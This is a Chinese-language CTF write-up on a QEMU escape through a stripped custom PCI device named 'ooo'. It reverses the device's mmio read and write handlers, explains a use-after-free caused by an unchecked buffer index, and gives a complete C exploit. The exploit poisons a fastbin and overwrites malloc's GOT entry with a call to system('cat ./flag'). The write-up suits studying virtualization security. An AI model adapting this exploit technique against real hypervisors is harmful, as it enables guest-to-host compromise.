此题目是一个去符号表的题目，启动命令如下

```shell
#!/bin/sh
./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-119-generic -append "priority=low console=ttyS0" -device ooo

```

可以看出有一个ooo设备，在ida里的函数表中搜寻ooo是搜不到的，那就尝试shift + f12来进行。

![image-20201015171732180](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201015171732180.png)

可以发现有一个ooo_class_init，在里面获取到我们想要的设备信息，vendor_id为0x420，device_id为0x1337，在虚拟机中`lspci`获取到相应的信息

```shell
/ # lspci
00:00.0 Class 0600: 8086:1237
00:01.0 Class 0601: 8086:7000
00:01.1 Class 0101: 8086:7010
00:01.3 Class 0680: 8086:7113
00:02.0 Class 0300: 1234:1111
00:03.0 Class 0200: 8086:100e
00:04.0 Class 00ff: 0420:1337
```

因为符号表已经被去掉，所以我们是找不到read，write函数的，但是我们可以根据经验来，一般来说，在xxx_class_init函数中会出现`realize`函数，`realize`函数中一般会存在一个ops结构体，里面存储着read，write函数的地址，我们可以根据这一条思路去进行逆向，寻找。

![image-20201018133932848](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201018133932848.png)

![image-20201018133950790](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201018133950790.png)

可以看到，read函数和write函数的地址就被我们找到了。对其进行逆向，获取到关键信息

`ooo_mmio_read`函数

```c
__int64 __fastcall ooo_mmio_read(__int64 a1, int a2, unsigned int size)
{
  unsigned int v4; // [rsp+34h] [rbp-1Ch]
  __int64 dest; // [rsp+38h] [rbp-18h]
  __int64 v6; // [rsp+40h] [rbp-10h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v6 = a1;
  dest = 0x42069LL;
  v4 = (a2 & 0xF0000u) >> 16;                   // 获取低位的第5个字节
  if ( (a2 & 0xF00000u) >> 20 != 0xF && my_buf[v4] )// 如果低位的第六个字节不是F且数组里有值
    memcpy(&dest, (char *)my_buf[v4] + (signed __int16)a2, size);
  return dest;
```

`ooo_mmio_write`函数

```c
void __fastcall ooo_mmio_write(__int64 opaque, __int64 addr, __int64 val, unsigned int size)
{
  unsigned int cmd; // eax
  char n[12]; // [rsp+4h] [rbp-3Ch]
  __int64 addr_; // [rsp+10h] [rbp-30h]
  __int64 v7; // [rsp+18h] [rbp-28h]
  __int16 v8; // [rsp+22h] [rbp-1Eh]
  int i; // [rsp+24h] [rbp-1Ch]
  unsigned int v10; // [rsp+28h] [rbp-18h]
  unsigned int bin; // [rsp+2Ch] [rbp-14h]
  unsigned int bin_; // [rsp+34h] [rbp-Ch]
  __int64 v13; // [rsp+38h] [rbp-8h]

  v7 = opaque;
  addr_ = addr;
  *(_QWORD *)&n[4] = val;
  v13 = opaque;
  v10 = ((unsigned int)addr & 0xF00000) >> 20;
  cmd = ((unsigned int)addr & 0xF00000) >> 20;
  switch ( cmd )
  {
    case 1u:
      free(my_buf[((unsigned int)addr_ & 0xF0000) >> 16]);
      break;
    case 2u:
      bin_ = ((unsigned int)addr_ & 0xF0000) >> 16;
      v8 = addr_;
      memcpy((char *)my_buf[bin_] + (signed __int16)addr_, &n[4], size);
      break;
    case 0u:
      bin = ((unsigned int)addr_ & 0xF0000) >> 16;
      if ( bin == 0xF )
      {
        for ( i = 0; i <= 14; ++i )
          my_buf[i] = malloc(8LL * *(_QWORD *)&n[4]);// malloc(val * sizeof(uint64_t)
      }
      else
      {
        my_buf[bin] = malloc(8LL * *(_QWORD *)&n[4]);
      }
      break;
  }
}
```

可以获取到的信息是：

1. 当低位的第六位是0时，获取低位的第五位信息，如果第五位是0xF，就循环malloc(val * sizeof(uint64_t)) 15次且其位置是bss段，也就是说是全局变量，否则只在指定的地点malloc一次
2. 当低位的第六位是1时，将指定地点的堆块free
3. 当低位的第六位是2时，将val的值写入指定的堆块

### 漏洞分析

注意此处的bin，直接从输入的addr进行取值，无检测，那也就意味着可以进行任意堆块的写入操作，配合free，达成了uaf的条件，我们可以往已经free的堆块里写入数据，修改fd/bk。

这题的情况是这样的，回收机制被破坏，Bin指令已经看不到了，所以会需要我们遍历所有的指针。操作如下：

1. malloc出一个0x70堆块，因为这是构建出来的虚拟机，所以chunksize中后三位的第三位（非主存分配）会置1，这也就导致了我们在内存中看到的size位是0x75（第三位和第一位置1）
2. malloc第二个，防止和topchunk合并（真的还有topchunk吗？）
3. free第一个堆块，然后往第一个堆块的fd位置写入0x131796d，为了再次malloc的时候使得那个地址的size位置符合fastbin的检测
4. 从这里开始就会出现非预测的情况了，这里并不会直接进行你exp的下一条命令，而是会在你原本的addr上+0x4再次执行一次（蛮离谱的，我也搞不懂为什么）
5. 所以这里我们就直接采用暴力的遍历，多次malloc和edit来确保我们的堆块成功被分配在了bss段的buf数组上，再将malloc的got表改成system('cat ./flag'）
6. 最后就调用malloc，就调用了system("cat ./flag")

### 漏洞exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>


#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

int fd = -1;
char *file = "sys/devices/pci0000:00/0000:00:04.0/resource0";

void pcimem(uint64_t target, char access_type, uint64_t writeval)
{
    uint64_t read_result;
    int type_width = 0;

    printf("mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\n",0,MAP_SIZE,PROT_READ | PROT_WRITE, MAP_SHARED,fd,(int)target);
    void *map_base = mmap(0,MAP_SIZE,PROT_READ | PROT_WRITE,MAP_SHARED,fd,target & ~MAP_MASK);
    if (map_base == (void *)-1)
        exit(-1);
    printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);

    void *virt_addr = map_base + (target & MAP_MASK);
    switch (access_type) {
        case 'b':
            *((uint8_t *) virt_addr) = writeval;
            read_result = *((uint8_t *) virt_addr);
            type_width = 1;
            break;
        case 'h':
            *((uint16_t *) virt_addr) = writeval;
            read_result = *((uint16_t *) virt_addr);
            type_width = 2;
            break;
        case 'w':
            *((uint32_t *) virt_addr) = writeval;
            read_result = *((uint32_t *) virt_addr);
            type_width = 4;
            break;
        case 'd':
            *((uint64_t *) virt_addr) = writeval;
            read_result = *((uint64_t *) virt_addr);
            type_width = 8;
            break;
    }
    printf("Written 0x%0*lx; readback 0x%*lx\n",type_width,writeval,type_width,read_result);
    if(munmap(map_base,MAP_SIZE) == -1)
        exit(-1);
}

int main(int argc,char **argv) {

    if ((fd = open(file, O_RDWR | O_SYNC)) == -1)
        exit(-1);
    printf("%s opened\n",file);

    pcimem(0x060000,'b',0xd); // 在数组的第七个索引处创建一个大小为0x70堆块
    pcimem(0x000000,'b',0xd); // 在数组的第一个索引处创建一个大小为0x70堆块
    pcimem(0x010000,'b',0xd); 

    pcimem(0x100000,'b',0xd);
    pcimem(0x200000,'d',0x131796d);

    int i = 0;
    for (i; i < 3; i++){
        pcimem(i << 16, 'b',0xd);
    }

    for (i = 0; i < 3 ; i++){
        pcimem((0x20 | i) << 16, 'd', 0x1130b78000000); // 将其地址改成malloc的got表
    }

    pcimem(0x280000,'d',0x6E65F9); // 对got表里面的内容进行改写
    pcimem(0x000000,'b',0x10);

    close(fd);
    exit(1);
    return 0;
}

```

